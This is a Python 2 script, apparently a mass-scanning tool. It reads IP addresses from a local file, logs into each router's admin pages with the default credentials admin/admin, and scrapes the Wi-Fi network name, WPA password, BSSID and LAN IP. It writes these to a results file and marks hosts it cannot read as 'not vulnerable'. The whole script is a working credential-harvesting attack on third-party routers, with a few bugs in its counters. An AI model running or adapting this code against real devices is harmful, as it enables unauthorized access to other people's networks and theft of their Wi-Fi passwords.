# -*- coding: utf-8 -*-
import requests as rq
import re
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup as bs
import socket
import threading
global  wifi
global no_wifi
rq = rq.Session()
archivo = 'C:\Users\Usuario\Desktop\salgar.txt'
wifi = 0
no_wfi = 0

def send_req(ip):
    try:

        ip1 = "http://%s/wlan_setup.htm"%(ip)
        mac = "http://%s/status_user.htm"%(ip)
        r = rq.get(mac, auth=HTTPBasicAuth("admin","admin"), timeout=6)
        r1 = rq.get(ip1, auth=HTTPBasicAuth("admin","admin"), timeout=6 )
        html = bs(r.content, "html.parser")
        html1 = bs(r1.content, "html.parser")
        mac_addres = bssid(html)
        contra = pwd(html1)
        name = ssid(html1)
        impr(name,contra,mac_addres, ip)
        wifi = wifi +1
    except:
        print "IP: %s no vulnerable"%(ip)
        no_wifi = no_wifi + 1

def impr(a,b,c,ip):
    data = "IP:%s\tSSID: %s\tPASSWORD: %s\t%s"%(ip,a,b,c)
    write_file(data)
    print data
def bssid(html):
    result = []
    for m in html.find_all("td",{'width':"60%"}):
        result.append(m)

    mac_add = (result[2].text).strip()
    ip_lan = (result[3].text).strip()
    return "BSSID: %s \t LAN_IP: %s"%(mac_add, ip_lan)

def pwd(html1):
    h = (html1.find_all("script"))[6].string
    linea = h.split('\n')
    for i in linea:
        if "wps_psk_old" in i:
            pwd = str(i.split("'")[1])
            return pwd.strip()

def ssid(html1):
    for nombre in html1.find_all("input", {'name':"wl_ssid0"}):
        name = nombre["value"]
        return str(name.strip())

def write_file(data):
        with open('C:\Users\Usuario\Desktop\salgar_wifi.txt','a+') as fh:
            fh.write(str(data)+"\n")
        

def read_file(path):
    with open(path) as fh:
       fstring = fh.readlines()

    pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'

    for line in fstring:
        ip = re.findall(pattern,line)
        try:
            ip =  str(ip[0])
            send_req(ip)
        except:
            pass
read_file(archivo)
print "%s wifi encontrados"%(wifi)
print "%s no routers"%(no_wifi)
